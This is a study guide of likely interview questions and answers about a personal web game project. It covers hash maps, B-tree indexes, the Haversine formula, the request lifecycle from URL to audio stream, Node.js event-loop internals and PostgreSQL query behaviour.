# RadioGuessr — Deep CS Questions, Redis Commands & URL Lifecycle

> This doc covers everything an interviewer can pivot to after hearing about your project.
> Every answer is tied to your actual codebase. Read this after the other 3 docs.

---

# PART 1 — DATA STRUCTURES & ALGORITHMS

---

## 1.1 — "You use a JavaScript Map for rate limiting and sessions. What is a Map internally?"

A JavaScript `Map` is a hash map — it stores key-value pairs in a hash table. The hash table uses a hash function to convert a key into an index into an internal array. Lookup, insert, and delete are all O(1) average case.

**In your code:**
```js
const store = new Map(); // ip -> [timestamp, timestamp, ...]
```
The key is the IP string (e.g. `"192.168.1.1"`), the value is an array of timestamps. `store.get(ip)` hashes the IP string and finds the bucket — O(1). `store.set(ip, timestamps)` is also O(1).

**Map vs Object in JS:**
`{}` objects can only use strings and Symbols as keys. `Map` can use any value — objects, functions, primitives. `Map` also preserves insertion order and has a built-in `.size` property. For IP → array mappings, `Map` is semantically cleaner than `{}`.

**Hash collision:** Two different keys can hash to the same index. JS engines handle this with chaining (a linked list at each bucket) or open addressing (probing nearby slots). In practice, collisions are rare and average complexity stays O(1).

---

## 1.2 — "You store seen station UUIDs in a Set. Why a Set over an Array? What's the complexity difference?"

```js
session = { seenUUIDs: new Set(), lastSeen: Date.now() };
// ...
if (seenUUIDs.has(s.stationuuid)) continue; // O(1)
seenUUIDs.add(s.stationuuid);               // O(1)
```

**`Set.has()` — O(1).** A Set is internally a hash set. Checking membership hashes the value and looks up the bucket.

**`Array.includes()` — O(n).** An array has no hash structure. It must check every element linearly until it finds a match or exhausts the array.

In a game with 5 rounds and at most 5 UUIDs in the set, the difference is negligible. But the semantic meaning is clearer with a Set — it models "a collection of unique values where membership check is the primary operation." If the game had 100 rounds, the O(1) vs O(n) difference would matter at scale.

---

## 1.3 — "Your leaderboard uses a B-tree index. How does a B-tree work?"

A B-tree is a self-balancing tree data structure where each node can have multiple keys and multiple children. It's optimized for disk I/O — each node is sized to fit a disk page (typically 8KB in Postgres), minimizing the number of disk reads needed to traverse the tree.

**Structure:**
- Each internal node stores K sorted keys and K+1 child pointers.
- All values live in leaf nodes.
- The tree is always balanced — all leaf nodes are at the same depth.
- Postgres's B-tree for `total_score DESC` stores score values in descending order at the leaves.

**Your leaderboard query:**
```sql
ORDER BY total_score DESC LIMIT 20
```
Postgres starts at the root of the B-tree index, follows pointers to the leftmost leaf (highest score), then reads 20 entries sequentially across the leaf level. Cost: O(log N) to find the first entry + O(20) sequential reads = O(log N + 20). Effectively constant for any reasonable table size.

**Why B-tree over a hash index for ORDER BY?**
A hash index hashes the key — the result has no meaningful order. You can do equality lookups (`WHERE total_score = 5000`) but not range queries or `ORDER BY`. A B-tree preserves the sorted order of keys, so `ORDER BY total_score DESC LIMIT 20` directly walks the index in order without sorting.

**B-tree vs B+ tree:**
PostgreSQL actually uses B+ trees (a variant). The difference: in a B+ tree, all data lives in leaf nodes, and leaf nodes are linked in a doubly-linked list. This makes range scans even faster — after finding the starting point, you just walk the leaf chain without going back up the tree.

---

## 1.4 — "Your weighted country pool uses Math.log10. Explain why log scale."

```js
const weight = Math.max(1, Math.min(4, Math.round(Math.log10(count) * 1.5)));
```

The station counts range enormously:
- US: 6,983 stations
- ZW (Zimbabwe): 6 stations

If you used linear weights, the US would dominate the pool so heavily that players would almost always get an English-speaking station. That's not a fun or educational game.

**Log scale compresses this range:**
- `Math.log10(6983)` ≈ 3.84 → weight 4 (after * 1.5 and rounding)
- `Math.log10(6)` ≈ 0.78 → weight 1

So the US gets 4 pool entries, Zimbabwe gets 1. The US is 4x more likely, not 1163x more likely. Players still encounter rare countries, but larger countries appear more often — increasing the chance of finding a working stream.

**Why does a working stream matter?**
Radio Browser data is imperfect — many station URLs are broken. Countries with more stations have higher density of working streams. Biasing toward them reduces the number of retries needed per round.

---

## 1.5 — "What is the time and space complexity of your sliding window rate limiter?"

**Time complexity per request: O(n)** where n is the number of timestamps in the window.

```js
while (timestamps.length && timestamps[0] < windowStart) timestamps.shift();
```
`Array.shift()` removes the first element — O(n) because it shifts all remaining elements left. But since the array is bounded by `max` (e.g., 5 for login), n ≤ 5. Effectively O(1).

If you used a `deque` (double-ended queue) instead of an array, `shift()` would be O(1) truly. JavaScript doesn't have a built-in deque, so you'd implement one with a linked list or a circular buffer. For small `max` values, the array is fine.

**Space complexity: O(n * max)** where n is unique IPs seen in the window. Each IP stores at most `max` timestamps. The `setInterval` purge removes IPs that haven't made a request in `2 * windowMs`, bounding the store size.

**Follow-up: "Is your rate limiter correct under concurrency?"**
Node.js is single-threaded — only one piece of JavaScript runs at a time. There are no race conditions on the in-memory Map. If you moved to multiple server instances with a shared Redis rate limiter, you'd need atomic operations (`ZADD` + `ZCOUNT` in a Lua script or Redis transaction) to prevent race conditions there.

---

## 1.6 — "How would you implement LRU eviction for your cache without Redis?"

LRU (Least Recently Used) eviction removes the entry that was accessed least recently when the cache is full.

**Implementation: HashMap + Doubly Linked List**

```
HashMap: key → node
Doubly Linked List: head (most recent) ↔ ... ↔ tail (least recent)
```

On `get(key)`:
1. Look up node in HashMap — O(1).
2. Move node to head of the list (mark as most recently used) — O(1).
3. Return value.

On `set(key, value)`:
1. If key exists, update value and move to head.
2. If cache is full, remove the tail node (least recently used) and its HashMap entry.
3. Insert new node at head and add to HashMap.

All operations O(1).

**Why your current Redis cache doesn't need this:**
Redis has built-in eviction policies configured with `maxmemory-policy`. `allkeys-lru` evicts the globally least-recently-used key when memory is full. You set this in the Redis config — no application code needed. This is one of the advantages of using Redis over a hand-rolled cache.

---

## 1.7 — "Derive the Haversine formula step by step."

The Haversine formula gives the great-circle distance between two points on a sphere.

**Given:**
- Point 1: (lat₁, lng₁)
- Point 2: (lat₂, lng₂)
- Earth radius R = 6,371 km

**Step 1 — Convert to radians:**
Lat/lng are in degrees. Trigonometric functions need radians.
`rad = degrees × π / 180`

**Step 2 — Compute differences:**
```
Δlat = lat₂ - lat₁  (in radians)
Δlng = lng₂ - lng₁  (in radians)
```

**Step 3 — Apply Haversine function:**
The haversine of an angle θ is: `hav(θ) = sin²(θ/2)`

```
a = sin²(Δlat/2) + cos(lat₁) × cos(lat₂) × sin²(Δlng/2)
```

The `cos(lat₁) × cos(lat₂)` term accounts for the fact that longitude lines converge toward the poles. At lat 60°N, cos(60°) = 0.5 — meaning the east-west component contributes half as much to the angular distance as it would at the equator.

**Step 4 — Compute central angle:**
```
c = 2 × atan2(√a, √(1-a))
```
`atan2` is the two-argument arctangent — more numerically stable than `asin(√a)` for near-antipodal points.

**Step 5 — Multiply by radius:**
```
distance = R × c  (in km)
```

**Your code:**
```js
const a = Math.sin(dLat/2)**2
        + Math.cos(toRad(guessLat)) * Math.cos(toRad(actualLat)) * Math.sin(dLng/2)**2;
const km = Math.round(R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)));
```
Exact match to the formula. Accurate to ~0.5% (Earth is an oblate spheroid, not a perfect sphere — the Vincenty formula handles this but is overkill for a game).

---

## 1.8 — "What is the scoring function's shape and why exponential decay?"

```js
score = Math.round(5000 * Math.exp(-10 * km / 20015))
```

**Why exponential:**
`e^(-x)` starts at 1 when x=0 and decreases toward 0, never negative. It naturally maps distance (0 to ~20,000km) to score (5000 to ~0).

**The constant `-10` controls steepness.**
At x = 1 (maximum distance, 20,015km): `e^(-10)` ≈ 0.000045 → ~0 points.
A smaller constant (like -5) would give more points for large distances — easier game.
A larger constant (like -20) would be very punishing for even moderate errors.

**Why not linear?**
`score = 5000 × (1 - km/20015)` — linear would give 2500 points at 10,000km, which feels too generous. Being on the wrong continent shouldn't give half points.

**Why not step function?**
`if km < 500: 5000, elif km < 2000: 3000, else: 0` — arbitrary thresholds feel unfair. Exponential is smooth and feels natural.

---

# PART 2 — NETWORKING & HTTP

---

## 2.1 — "What happens when you type http://localhost:5173 and press Enter?" (Full deep dive)

This is the canonical "what happens when you type a URL" question, applied to your dev setup.

---

### Step 1: URL Parsing

The browser parses the URL:
- **Protocol:** `http` (not HTTPS — localhost is exempt from mixed content rules)
- **Host:** `localhost`
- **Port:** `5173`
- **Path:** `/` (default)

---

### Step 2: DNS Resolution

The browser needs to resolve `localhost` to an IP address.

1. **Browser DNS cache** — checked first. `localhost` is almost certainly cached.
2. **OS hosts file** — `/etc/hosts` (Linux/Mac) or `C:\Windows\System32\drivers\etc\hosts` (Windows). `localhost` is defined here as `127.0.0.1` (IPv4) and `::1` (IPv6). This is why `localhost` resolves without a DNS server.
3. **If not in hosts file** — OS resolver queries the configured DNS server (your router, `8.8.8.8`, etc.). For `localhost`, this never happens in practice.

**Result:** `localhost` → `127.0.0.1` (loopback address — traffic stays on your machine, never hits the network).

---

### Step 3: TCP Connection

The browser opens a TCP connection to `127.0.0.1:5173`.

**TCP three-way handshake:**
1. **SYN** — browser sends a SYN packet to the server. "I want to connect. My initial sequence number is X."
2. **SYN-ACK** — server (Vite) responds. "OK, I acknowledge X. My initial sequence number is Y."
3. **ACK** — browser acknowledges Y. Connection established.

This takes one round trip. For localhost, round trip time is ~0.1ms. For a remote server, it might be 50-200ms.

**Why TCP and not UDP?**
TCP guarantees ordered, reliable delivery. HTTP requires this — a web page with packets arriving out of order or dropped would be broken. UDP is faster but unreliable — used for things like video streaming or gaming where a dropped packet is better ignored than retransmitted.

---

### Step 4: HTTP Request

The browser sends an HTTP/1.1 GET request over the TCP connection:

```
GET / HTTP/1.1
Host: localhost:5173
Accept: text/html,application/xhtml+xml,...
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 ...
```

**Key headers:**
- `Host` — required in HTTP/1.1. Tells the server which virtual host is being requested (one IP can serve multiple domains).
- `Accept-Encoding: gzip` — browser says "I can decompress gzip". Server can compress the response to save bandwidth.
- `Connection: keep-alive` — "don't close the TCP connection after this request, I'll make more." Avoids the overhead of a new TCP handshake per request.

---

### Step 5: Vite Dev Server Processes the Request

Vite is a Node.js HTTP server listening on port 5173. It receives the request and:

1. **Checks if `/` maps to an asset.** It does — serves `index.html`.
2. **Transforms `index.html`** — injects the Vite client script for HMR (Hot Module Replacement).
3. **Returns the response:**

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Transfer-Encoding: chunked
...

<!DOCTYPE html>
<html>
  <head>
    <script type="module" src="/@vite/client"></script>
    <script type="module" src="/src/main.jsx"></script>
  </head>
  ...
</html>
```

---

### Step 6: Browser Parses HTML, Discovers Resources

The browser parses the HTML and finds:
- `<script type="module" src="/src/main.jsx">` — triggers another HTTP GET to Vite for the JS.
- Any CSS `<link>` tags — more GETs.

Vite serves JavaScript as native ES modules — no bundling in dev. Each `import` statement in your code triggers a separate HTTP request for that module. This is why Vite's dev server is fast — it doesn't bundle everything upfront.

---

### Step 7: JavaScript Executes, React Mounts

`main.jsx` runs. React's `createRoot(document.getElementById('root')).render(<App />)` executes. The virtual DOM is built, the real DOM is populated, the globe canvas is initialized, and the start screen renders.

---

### Step 8: When You Click Play — The API Request

When you click Play, `api.js` does:
```js
fetch('/api/station?sessionId=abc123')
```

**The Vite proxy intercepts this.** Vite's `vite.config.js` says: any request to `/api/*` should be forwarded to `http://localhost:3001`. Vite makes a new HTTP request to Express on your behalf and streams the response back. This happens inside the same Node.js process as Vite.

**Why the proxy?**
Without it, the browser would make a cross-origin request from `localhost:5173` to `localhost:3001`. Different ports = different origin = CORS. The proxy makes it appear same-origin to the browser.

---

### Step 9: Express Handles the Request

Express on port 3001 receives the request. Middleware runs in order:
1. `express.json()` — parses the body (GET has no body, skipped).
2. CORS middleware — checks origin header, sets `Access-Control-Allow-Origin`.
3. `stationLimiter` — checks IP's timestamp array.
4. Route handler — calls `pickStation()`, which calls Redis, which may call Radio Browser.

---

### Step 10: The Redis Request (Upstash)

`cache.get(key)` fires an HTTPS request to Upstash:

```
GET https://xxxx.upstash.io/get/rg:cache:DE:votes:true:40:jazz
Authorization: Bearer <token>
```

This goes through:
1. **DNS** — resolves `xxxx.upstash.io` to an IP (e.g., `13.x.x.x`).
2. **TCP + TLS handshake** — HTTPS requires an additional TLS handshake after TCP. This involves exchanging certificates, agreeing on an encryption cipher, and establishing session keys. The first connection pays this cost (~100ms); subsequent connections reuse the session (TLS session resumption).
3. **HTTP GET** — Upstash returns `"null"` (miss) or the JSON string (hit).

---

### Step 11: If Cache Miss — Radio Browser Request

`fetch('https://de1.api.radio-browser.info/json/stations/search?...')` goes through the same DNS → TCP → TLS → HTTP sequence but to a different server in Germany.

Radio Browser returns a JSON array of stations. The server picks one, writes to Redis (fire-and-forget), and returns the station to the browser.

---

### Step 12: Browser Receives Station, Audio Starts

`fetchStation()` in `api.js` resolves with the station object. `useGameStore.startRound()` sets `station` in Zustand state. `audio.js` creates an `<audio>` element (or HLS.js instance) pointed at the stream URL. The browser makes yet another HTTP/HTTPS request — this time to the radio station's server — to start streaming audio.

---

### Step 13: WebSocket for HMR (Dev only)

In development, Vite also opens a WebSocket connection from the browser to the Vite server. When you edit and save a file, Vite sends a message over this WebSocket: "module X changed, reload it." The browser hot-reloads just that module without a full page refresh. This is HMR — Hot Module Replacement.

---

## 2.2 — "What is HTTPS and TLS? Why does Upstash require it?"

**HTTP is plaintext.** Every router, ISP, and server between client and server can read the request and response. This is fine for localhost but catastrophic for passwords, tokens, and private data over the internet.

**TLS (Transport Layer Security)** encrypts the connection. It works in layers:

**TLS Handshake (simplified):**
1. Client sends `ClientHello` — "I support these cipher suites and TLS versions."
2. Server sends `ServerHello` + its certificate (containing the server's public key, signed by a Certificate Authority).
3. Client verifies the certificate — is it signed by a CA the browser trusts? Is the domain name correct?
4. Client generates a pre-master secret, encrypts it with the server's public key, sends it.
5. Both sides derive the same session key from the pre-master secret using agreed-upon algorithms.
6. All subsequent traffic is encrypted with the session key (symmetric encryption — fast).

**Why symmetric after asymmetric?**
Asymmetric (RSA, ECDH) is slow — mathematical operations on large numbers. Symmetric (AES) is fast. TLS uses asymmetric only to establish a shared secret, then symmetric for data.

**Why Upstash requires HTTPS:**
Your `UPSTASH_REDIS_REST_TOKEN` is sent in the Authorization header on every request. Over plain HTTP, anyone on the network path could steal this token and make unlimited Redis calls on your account. HTTPS encrypts the header — the token is invisible to network observers.

---

## 2.3 — "What is HTTP/2? Does it matter for your project?"

**HTTP/1.1 limitations:**
- One request per TCP connection at a time (head-of-line blocking). To send 6 requests simultaneously, the browser opens 6 TCP connections.
- Headers are sent as plaintext on every request, even repeated headers like `User-Agent`.

**HTTP/2 improvements:**
- **Multiplexing:** Multiple requests and responses over a single TCP connection simultaneously. No head-of-line blocking.
- **Header compression (HPACK):** Repeated headers are compressed. After the first request, `User-Agent` is sent as a 1-byte reference instead of 50+ bytes.
- **Server push:** Server can proactively send resources the client hasn't requested yet (e.g., push `styles.css` when it sends `index.html`). Rarely used in practice.
- **Binary protocol:** HTTP/1.1 is text-based. HTTP/2 is binary — more efficient to parse.

**Your project:**
Vite dev server uses HTTP/1.1. Upstash supports HTTP/2. Your Postgres connection is not HTTP at all — it uses PostgreSQL's own binary wire protocol over TCP. In production, a CDN like Cloudflare automatically upgrades connections to HTTP/2 or HTTP/3.

---

## 2.4 — "What is HLS and how does an .m3u8 file work?"

HLS (HTTP Live Streaming) was developed by Apple. It breaks a continuous audio/video stream into small segments and serves them over regular HTTP.

**The .m3u8 playlist file:**
A plain text file listing the segment URLs:
```
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:10
#EXTINF:10.0,
https://stream.example.com/segment0001.ts
#EXTINF:10.0,
https://stream.example.com/segment0002.ts
#EXTINF:10.0,
https://stream.example.com/segment0003.ts
```

Each `.ts` file is 10 seconds of audio. The client fetches the playlist, downloads the next segment while playing the current one, and repeats indefinitely (live streams update the playlist periodically, adding new segments and removing old ones).

**Why HLS over a direct stream?**
- Works over plain HTTP — no special streaming protocol needed. CDNs cache segments easily.
- Adaptive bitrate: a master playlist lists multiple quality levels. The client picks the one that fits its current bandwidth.
- More reliable — if a segment fails, retry just that segment. A dropped TCP connection to a direct stream means starting over.

**Your code:**
```js
if (url.includes('.m3u8') && Hls.isSupported()) {
  const hls = new Hls();
  hls.loadSource(url);      // fetch the playlist
  hls.attachMedia(audio);   // connect to <audio> element
}
```
HLS.js polls the playlist URL periodically (for live streams), downloads segments, and feeds them to the browser's MediaSource Extensions API.

**Why native `<audio>` can't do this on Chrome/Firefox:**
The browser's `<audio>` tag expects a single URL pointing to an audio file or a continuous stream. It doesn't know how to fetch a playlist, parse it, download segments, and concatenate them. HLS.js does all of this in JavaScript.

---

## 2.5 — "What is WebSocket? How does it differ from HTTP?"

HTTP is request-response: client sends a request, server sends a response, connection can be reused but the server can't send data unsolicited.

**WebSocket** is a full-duplex, persistent connection. After an initial HTTP handshake (an "upgrade" request), the connection stays open and both client and server can send messages at any time.

**The upgrade:**
```
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```
Server responds with `101 Switching Protocols`. From that point, the connection speaks the WebSocket binary framing protocol, not HTTP.

**In your project:**
Vite uses WebSocket for HMR — when you save a file, Vite pushes a message to the browser without the browser having to poll. You'd also use WebSocket (via Socket.io) for the multiplayer feature — the server needs to push "your opponent submitted their guess" without the client polling every second.

---

## 2.6 — "What is CORS and how does your server handle it?"

**Same-Origin Policy:** Browsers block JavaScript from making requests to a different origin (protocol + host + port). `http://localhost:5173` is a different origin from `http://localhost:3001`.

**CORS (Cross-Origin Resource Sharing):** A mechanism to selectively relax the Same-Origin Policy. The server tells the browser "I allow requests from this origin."

**Your code:**
```js
const allowed = ['http://localhost:5173', 'https://radioguessr.space'];
const origin = req.headers.origin;
if (allowed.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
```

**Preflight requests:**
For non-simple requests (POST with JSON body, or any request with an `Authorization` header), the browser first sends an `OPTIONS` request to ask "do you allow this?" Your server responds with the CORS headers and a 204. Then the browser sends the real request.

**Why not `Access-Control-Allow-Origin: *`?**
Wildcard disallows credentials (cookies, Authorization headers). Since your leaderboard requests send `Authorization: Bearer <token>`, you need a specific origin, not `*`.

**In development, the Vite proxy avoids this entirely.** The browser makes requests to `localhost:5173` (same origin as the frontend). Vite forwards them to `localhost:3001` server-to-server. Server-to-server requests are not subject to browser CORS policy — only browser JavaScript requests are. So in dev, your CORS headers are never even checked.

---

# PART 3 — NODE.JS INTERNALS

---

## 3.1 — "Node.js is single-threaded. How does it handle 100 concurrent station requests?"

**The event loop is the answer.**

Node.js has one thread running JavaScript. But I/O operations (network requests, file reads, database queries) are non-blocking — they're handed off to the operating system or libuv's thread pool, which handles them in the background. When the I/O completes, a callback is queued.

**Phases of the Node.js event loop (order):**
1. **timers** — executes `setTimeout` and `setInterval` callbacks whose delay has elapsed.
2. **pending callbacks** — I/O callbacks deferred from the previous iteration.
3. **idle, prepare** — internal use.
4. **poll** — retrieve new I/O events; execute I/O-related callbacks. This is where most time is spent — the event loop blocks here waiting for I/O if there's nothing else to do.
5. **check** — `setImmediate` callbacks.
6. **close callbacks** — e.g., `socket.on('close', ...)`.

**For your 100 concurrent station requests:**
1. Request 1 arrives. Express handler runs. `await cache.get(key)` — Node starts an HTTP request to Upstash and suspends the handler (registers a callback for when the HTTP response arrives).
2. Request 2 arrives. Express handler runs. `await cache.get(key)` — another HTTP request to Upstash, another suspension.
3. Requests 3-100 arrive similarly.
4. Now Node is sitting in the poll phase. 100 outgoing HTTP connections are in flight, OS/libuv handles them.
5. Upstash starts responding. As each response arrives, the corresponding callback is queued.
6. Node processes callbacks one by one — resumes each handler, returns the station data, sends the HTTP response.

**The key insight:** Node is waiting on network I/O 99% of the time for this workload. While waiting, the event loop is free to accept new requests and start their I/O. This is why Node is excellent for I/O-bound work (API servers, proxies) and poor for CPU-bound work (image processing, heavy computation).

---

## 3.2 — "bcrypt blocks the event loop for 100ms. What does that mean exactly? How would you fix it?"

`bcryptjs.hash(password, 10)` is a pure JavaScript function that runs CPU-intensive computations (10 rounds of Blowfish key expansion and hashing). Unlike `await fetch(...)`, there is no I/O to delegate — it's just JavaScript doing math.

**What blocking means:**
During those 100ms, the JavaScript thread is fully occupied. The event loop cannot process any other callbacks. No new requests are accepted (they queue in the OS's TCP buffer). No other responses are sent. Your entire server is frozen for 100ms per registration.

**For your project:** Low traffic — 100ms per register is acceptable. If 10 users register simultaneously, the last one waits ~1 second. Not ideal but not catastrophic.

**How to fix for production:**

**Option 1: Worker Threads (Node.js built-in)**
```js
import { Worker } from 'worker_threads';
// Run bcrypt in a separate thread — doesn't block the event loop
```
Worker threads run JavaScript in parallel OS threads. The main event loop continues processing requests while the worker hashes.

**Option 2: Use argon2 with native bindings**
Argon2's Node.js binding runs the hash in libuv's thread pool (like file I/O) — automatically non-blocking. The main thread is free during hashing.

**Option 3: Offload to a dedicated auth microservice**
The auth service is CPU-bound — separate it from the API server. The API server just delegates to it via HTTP.

---

## 3.3 — "What is async/await under the hood?"

`async/await` is syntactic sugar over Promises, which are built on callbacks.

**A Promise:**
```js
fetch(url)                    // returns a Promise
  .then(res => res.json())    // callback when resolved
  .catch(err => ...)          // callback when rejected
```

**async/await:**
```js
const res = await fetch(url);   // pauses here until Promise resolves
const data = await res.json();
```

The `await` keyword doesn't block the thread. It's compiled to a state machine:
```js
// async function is roughly equivalent to:
function fetchStation() {
  return fetch(url).then(res => {
    return res.json().then(data => {
      return data;
    });
  });
}
```

The function suspends at each `await`, yields control back to the event loop, and resumes when the Promise resolves. Under the hood, V8 (Chrome/Node's JS engine) compiles `async` functions into generator functions + a Promise runner.

**Microtask queue:**
Promise callbacks run in the microtask queue, which is processed between each phase of the event loop — before moving to timers or I/O. This means Promise resolutions are processed before `setTimeout` callbacks, even with `setTimeout(fn, 0)`.

---

## 3.4 — "What is a memory leak? Could your sessions Map leak?"

A memory leak is memory that is allocated but never freed — the garbage collector can't reclaim it because something still holds a reference to it.

**Your sessions Map:**
```js
const sessions = new Map();
// sessions.set(sessionId, { seenUUIDs: new Set(), lastSeen: Date.now() });
```

Each session stores a `Set` of up to 5 UUIDs — tiny. But if sessions are never deleted, the Map grows forever. Every browser tab that ever opened the game adds an entry.

**Your fix:**
```js
setInterval(() => {
  const cutoff = Date.now() - SESSION_TTL_MS; // 2 hours
  for (const [id, session] of sessions) {
    if (session.lastSeen < cutoff) sessions.delete(id);
  }
}, 30 * 60 * 1000); // every 30 minutes
```
Sessions inactive for 2 hours are deleted. The Map is bounded in size. This is correct.

**Other common Node.js memory leaks:**
- Event listener accumulation — `emitter.on('event', fn)` called repeatedly without `removeListener`. The reference to `fn` prevents garbage collection.
- Closures capturing large objects — an `async` function closure captures a reference to a large request object; if the Promise never resolves, the object stays in memory.
- Global caches without eviction — exactly the problem Redis solves with TTL.

---

## 3.5 — "What does import 'dotenv/config' do?"

```js
import 'dotenv/config'; // first line of server/index.js
```

`dotenv` reads the `.env` file in the current working directory, parses it line by line, and for each `KEY=VALUE` pair, sets `process.env.KEY = 'VALUE'` — if that key isn't already set in the environment.

**Why first line?**
`process.env.DATABASE_URL` must be set before `server/db.js` is imported. Node.js processes `import` statements before executing the module body, but within a single module, top-level `import` declarations are hoisted. By putting `import 'dotenv/config'` at the very top, we ensure it runs before any subsequent imports that read `process.env`.

**Why not hardcode secrets:**
If you commit `DATABASE_URL=postgresql://postgres:MyPassword@...` to a public GitHub repository, automated scanners (bots constantly scanning GitHub) find and exploit it within minutes. Environment variables are the standard pattern — the production values are set in the deployment environment (Heroku config vars, AWS Parameter Store, etc.), never in code.

---

# PART 4 — DATABASE DEEP DIVE

---

## 4.1 — "What is ACID? Does it apply to your project?"

ACID is a set of properties that guarantee database transactions are reliable:

**Atomicity:** A transaction either fully completes or fully rolls back. No partial writes. In your project: `INSERT INTO game_sessions` either fully inserts or doesn't insert at all. You'll never have a half-written row.

**Consistency:** A transaction brings the database from one valid state to another. Your `REFERENCES users(id)` foreign key constraint ensures `game_sessions.user_id` always points to a real user. A transaction that tries to insert an orphaned game session is rejected.

**Isolation:** Concurrent transactions don't interfere with each other. If two users submit scores simultaneously, their `INSERT` statements don't see each other's partial state. Postgres uses MVCC (Multi-Version Concurrency Control) for this.

**Durability:** Once a transaction commits, it's permanent — even if the server crashes immediately after. Postgres writes to a Write-Ahead Log (WAL) before confirming the commit.

**Why this matters for your leaderboard:** If a user saves a score and the server crashes mid-write, ACID ensures the score is either fully saved or not at all. You'll never have a corrupt partial row in `game_sessions`.

---

## 4.2 — "What is a database transaction? When would you need one?"

A transaction groups multiple SQL statements into a single atomic unit.

```sql
BEGIN;
  INSERT INTO game_sessions (user_id, total_score, countries) VALUES ($1, $2, $3);
  UPDATE users SET games_played = games_played + 1 WHERE id = $1;
COMMIT;
```

If the `UPDATE` fails, the `INSERT` is rolled back automatically.

**In your current project:** You don't explicitly use transactions because each route makes a single write. But if you added a `games_played` counter on the `users` table, you'd need a transaction to atomically insert the game session AND increment the counter — otherwise a crash between the two statements would leave them out of sync.

**In your pg code:**
```js
const client = await pool.connect();
try {
  await client.query('BEGIN');
  await client.query('INSERT INTO game_sessions ...', [userId, score, countries]);
  await client.query('UPDATE users SET games_played = games_played + 1 WHERE id = $1', [userId]);
  await client.query('COMMIT');
} catch (err) {
  await client.query('ROLLBACK');
  throw err;
} finally {
  client.release(); // return connection to pool
}
```

---

## 4.3 — "What is the N+1 query problem? Does your leaderboard have one?"

The N+1 problem: you fetch a list of N items, then for each item, make a separate query — N+1 total queries.

**Bad example:**
```js
const sessions = await query('SELECT * FROM game_sessions ORDER BY total_score DESC LIMIT 20');
for (const session of sessions.rows) {
  const user = await query('SELECT username FROM users WHERE id = $1', [session.user_id]);
  // 20 separate queries to users table!
}
```
This is 1 (sessions) + 20 (users) = 21 queries.

**Your leaderboard — no N+1:**
```sql
SELECT u.username, gs.total_score, gs.countries, gs.played_at
FROM game_sessions gs
JOIN users u ON u.id = gs.user_id
ORDER BY gs.total_score DESC
LIMIT 20;
```
This is 1 query. Postgres's query planner fetches game sessions (using the index), then does 20 lookup joins into users — all within a single query execution. One round trip to the database.

---

## 4.4 — "What is EXPLAIN ANALYZE? Walk me through what it shows for your leaderboard query."

`EXPLAIN ANALYZE` executes a query and shows the query plan plus actual execution statistics.

**Run this in Supabase SQL editor:**
```sql
EXPLAIN ANALYZE
SELECT u.username, gs.total_score, gs.countries, gs.played_at
FROM game_sessions gs
JOIN users u ON u.id = gs.user_id
ORDER BY gs.total_score DESC
LIMIT 20;
```

**What to look for in the output:**

```
Limit  (cost=0.29..1.45 rows=20 width=120) (actual time=0.031..0.089 rows=20 loops=1)
  -> Nested Loop  (cost=0.29..X rows=X width=120)
       -> Index Scan Backward using idx_game_sessions_score on game_sessions gs
            (cost=0.15..Y rows=20 width=80) (actual time=0.020..0.040 rows=20 loops=1)
       -> Index Scan using users_pkey on users u
            (cost=0.14..0.18 rows=1 width=40) (actual time=0.003..0.003 rows=1 loops=20)
Planning Time: 0.1 ms
Execution Time: 0.1 ms
```

**Reading it:**
- `Index Scan Backward using idx_game_sessions_score` — Postgres is using your index, scanning in descending order. Good.
- `Nested Loop` — for each of the 20 game sessions, it does an index lookup on `users_pkey` (the primary key index on `users.id`). 20 lookups, each O(log N) on the users table.
- `Seq Scan` (bad) would mean no index used — full table read.
- `actual time=0.031..0.089 rows=20` — took 0.089ms total. Fast.

**A "covering index" would eliminate the users lookup:**
```sql
CREATE INDEX idx_game_sessions_covering
ON game_sessions(total_score DESC)
INCLUDE (user_id, countries, played_at);
```
This stores `user_id`, `countries`, and `played_at` directly in the index. The query could be answered entirely from the index without touching the main table (heap). For a leaderboard with millions of rows, this optimization could halve query time.

---

## 4.5 — "What is cursor-based pagination vs OFFSET pagination?"

**OFFSET pagination (what you'd use naively):**
```sql
SELECT * FROM game_sessions ORDER BY total_score DESC LIMIT 20 OFFSET 40;
-- "Give me items 41-60"
```
Problem: Postgres must fetch and discard 40 rows before returning the 20 you want. At OFFSET 10,000, it's discarding 10,000 rows — O(N) cost even with an index.

**Cursor-based pagination:**
```sql
-- First page
SELECT * FROM game_sessions ORDER BY total_score DESC LIMIT 20;
-- Returns rows with scores: 24800, 23500, ..., 19200

-- Next page: "give me rows after score 19200"
SELECT * FROM game_sessions
WHERE total_score < 19200
ORDER BY total_score DESC
LIMIT 20;
```
Using the index, Postgres finds score 19200 in O(log N) and returns the next 20. O(log N + 20) regardless of which page you're on.

**Tie problem:** If multiple players have `total_score = 19200`, a simple `< 19200` would skip them. Fix: use a composite cursor on `(total_score DESC, id ASC)` since `id` (UUID) is unique.

**For your leaderboard:** 20 entries, no pagination needed. But in a real interview, knowing this distinction shows depth.

---

## 4.6 — "What is connection pooling? Why does your pg.Pool have max: 10?"

Every database query needs a connection — a persistent TCP connection to the Postgres server with an authenticated session. Establishing a new connection takes 20-100ms and consumes server resources.

**Without pooling:** Each query opens a new connection and closes it when done. For a server handling 100 requests/second, you'd open and close 100 connections/second. Postgres would spend more time managing connections than running queries.

**Connection pooling:** A pool of connections is established at startup and kept open. When a query needs a connection, it borrows one from the pool. When done, the connection is returned (not closed). Subsequent queries reuse it.

```js
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 10,                    // at most 10 simultaneous connections
  idleTimeoutMillis: 30000,   // close idle connections after 30s
  connectionTimeoutMillis: 5000, // fail if no connection available in 5s
});
```

**Why max 10:**
Supabase free tier allows a maximum of 25 connections to the database. The connection pooler (pgBouncer, which Supabase uses) multiplexes many app connections into fewer database connections. With `max: 10`, your server keeps at most 10 connections to the pooler, which is well within limits.

